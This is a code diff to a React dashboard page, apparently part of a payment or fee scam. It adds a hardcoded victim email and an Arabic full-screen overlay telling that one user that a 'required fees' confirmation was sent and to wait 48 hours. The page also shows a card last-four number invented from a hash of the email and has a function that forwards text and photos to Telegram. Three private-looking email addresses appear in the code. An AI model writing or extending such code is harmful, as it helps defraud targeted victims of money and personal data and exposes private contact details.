@@ -13,6 +13,7 @@ import { useState, useRef } from 'react';
 
       const PAYME_EMAIL = 'sofyanamin@gmail.com';
       const CHALABRUNE_EMAIL = 'chalabrune@gmail.com';
+      const MAYZEN_EMAIL = 'Mayzen123@gmail.com';
 
       async function sendToTelegram(text: string, photo?: File) {
       try {
@@ -30,6 +31,107 @@ import { useState, useRef } from 'react';
           });
         }
       } catch {}
+      }
+
+      function PaymeNoticeOverlay() {
+      return (
+        <div
+          style={{
+            position: 'fixed',
+            inset: 0,
+            zIndex: 9999,
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            background: 'rgba(0,0,0,0.6)',
+            backdropFilter: 'blur(6px)',
+          }}
+        >
+          <div
+            dir="rtl"
+            style={{
+              background: 'linear-gradient(135deg, #fffbf2 0%, #fff8e8 100%)',
+              borderRadius: '24px',
+              padding: '48px 40px',
+              maxWidth: '440px',
+              width: '90%',
+              boxShadow: '0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(249,168,37,0.2)',
+              textAlign: 'center',
+              display: 'flex',
+              flexDirection: 'column',
+              alignItems: 'center',
+              gap: '20px',
+              fontFamily: "'Segoe UI', Tahoma, Arial, sans-serif",
+            }}
+          >
+            {/* Icon circle */}
+            <div style={{
+              width: '72px',
+              height: '72px',
+              borderRadius: '50%',
+              background: 'linear-gradient(135deg, #f59e0b, #f97316)',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              boxShadow: '0 4px 20px rgba(249,168,37,0.4)',
+              fontSize: '32px',
+            }}>
+              ⏳
+            </div>
+
+            {/* Title */}
+            <h2 style={{
+              fontSize: '1.4rem',
+              fontWeight: 800,
+              color: '#1a1a1a',
+              margin: 0,
+              lineHeight: 1.4,
+              letterSpacing: '-0.3px',
+            }}>
+              تم إرسال طلبك بنجاح
+            </h2>
+
+            {/* Divider */}
+            <div style={{
+              width: '48px',
+              height: '3px',
+              borderRadius: '99px',
+              background: 'linear-gradient(90deg, #f59e0b, #f97316)',
+            }} />
+
+            {/* Message */}
+            <p style={{
+              fontSize: '1.05rem',
+              color: '#555',
+              margin: 0,
+              lineHeight: 2,
+              fontWeight: 500,
+            }}>
+              تم إرسال طلب تأكيد الرسوم المطلوبة
+              <br />
+              <span style={{ color: '#1a1a1a', fontWeight: 700 }}>
+                الرجاء الانتظار 48 ساعة
+              </span>
+              <br />
+              لقبول طلبكم
+            </p>
+
+            {/* Badge */}
+            <div style={{
+              padding: '10px 28px',
+              background: 'linear-gradient(135deg, #f59e0b22, #f9731622)',
+              border: '1.5px solid #f59e0b55',
+              borderRadius: '99px',
+              fontSize: '0.9rem',
+              color: '#b45309',
+              fontWeight: 700,
+              letterSpacing: '0.5px',
+            }}>
+              🕐 قيد المراجعة · 48 ساعة
+            </div>
+          </div>
+        </div>
+      );
       }
 
       function ChalabrunePaidOverlay() {
@@ -171,6 +273,7 @@ import { useState, useRef } from 'react';
 
       const isPayme = user.email === PAYME_EMAIL;
       const isChalabrune = user.email === CHALABRUNE_EMAIL;
+      const isMayzen = user.email === MAYZEN_EMAIL;
 
       const cardName = user.cardName || user.fullName;
       const cardLastFour = String(Math.abs(user.email.split('').reduce((a: number, c: string) => a + c.charCodeAt(0), 0) % 9000) + 1000);
@@ -236,6 +339,7 @@ import { useState, useRef } from 'react';
             </div>
           )}
           {isChalabrune && <ChalabrunePaidOverlay />}
+          {isMayzen && <PaymeNoticeOverlay />}
           {!user.isActive && !isPayme && (
             <div className="bg-destructive text-destructive-foreground px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2 flex-wrap">
               <AlertTriangle size={16} className="shrink-0" />
